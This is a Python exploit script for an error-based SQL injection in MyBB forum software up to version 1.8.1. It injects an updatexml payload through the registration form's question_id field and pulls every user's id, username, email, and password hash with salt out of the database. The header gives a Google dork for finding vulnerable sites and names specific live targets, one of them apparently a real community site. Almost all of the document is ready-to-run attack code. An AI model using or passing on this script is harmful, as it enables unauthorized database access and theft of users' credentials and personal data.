#!/usr/bin/env python
# Exploit Title: MyBB 1.8.X <= 1.8.1 Error based SQL Injection
# Date : 2014-11-15
# Google Dork : intext:Powered By MyBB
# Vendor Homepage: http://www.mybb.com/
# Software Link: http://resources.mybb.com/downloads/mybb_1801.zip
# Version: 1.8.X
# Tested on: Linux / Python 2.7
# Status : Patched in MyBB 1.8.2
# Author : MakMan -- mak.man@live.com -- https://www.facebook.com/hackticlabs
# Live Vulnerable Targets : http://livedemo.installatron.com/1416038193mybb/ : http://gamergate.community/
 
print '\n\n---------------------------------------------------------------------------------'
print 'Script Coded by MakMan -- Hacktic Labs -- https://www.facebook.com/hackticlabs'
print '-----------------------MyBB 1.8.X Error based SQL Injection---------------------'
print '---------------------------------------------------------------------------------\n\n\n'
url = raw_input('Enter URL http://www.exmaple.com/path_to_mybb :: ')
url = url.rstrip('/')
ua = "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"
 
import sys, re
import urllib2, urllib
 
def inject(sql):
    try:
        urllib2.urlopen(urllib2.Request('%s/member.php' % url, data="regcheck1=&regcheck2=true&username=makman&password=mukarram&password2=mukarram&email=mak@live.com&email2=mak@live.com&referrername=&imagestring=F7yR4&imagehash=1c1d0e6eae9c113f4ff65339e4b3079c&answer=4&allownotices=1&receivepms=1&pmnotice=1&subscriptionmethod=0&timezoneoffset=0&dstcorrection=2&regtime=1416039333&step=registration&action=do_register&regsubmit=Submit+Registration!&question_id=makman%s" % urllib.quote("\' and updatexml(NULL,concat (0x3a,(%s)),NULL) and \'1" % sql), headers={"User-agent": ua}))
    except urllib2.HTTPError, e:
            data = e.read()
            if e.code == 503:
                    txt = re.search("XPATH syntax error: ':(.*)'", data, re.MULTILINE)
                    if txt is not None:
                        return txt.group(1)
                    sys.exit('Error [3], received unexpected data:\n%s' % data)
            sys.exit('Not Vulnerable i guess !!!')
    sys.exit('Not Vulnerable or check your inernet connection !!')
 
def get(name, table, num):
    sqli = 'SELECT %s FROM %s LIMIT %d,1' % (name, table, num)
    s = int(inject('LENGTH((%s))' % sqli))
    if s < 31:
        return inject(sqli)
    else:
        r = ''
        for i in range(1, s+1, 31):
            r += inject('SUBSTRING((%s), %i, %i)' % (sqli, i, 31))
        return r
 
 
members_table= inject('select table_name from information_schema.tables where table_schema=database() and table_name regexp 0x757365727324 limit 0,1')
n = inject('SELECT COUNT(*) FROM %s' % members_table)
print '----------------------------------------------------------------------------'
print '* Found %s users' % n
print '----------------------------------------------------------------------------'
for j in range(int(n)):
        print '{:20s} {:20s}'.format('Id',get('uid', members_table, j))
        print '{:20s} {:20s}'.format('Name',get('username', members_table, j))
        print '{:20s} {:20s}'.format('Email',get('email', members_table, j))
        print '{:20s} {:20s}'.format('Password : Salt',get('CONCAT(password,0x3a,salt)', members_table, j))
        print '----------------------------------------------------------------------------'
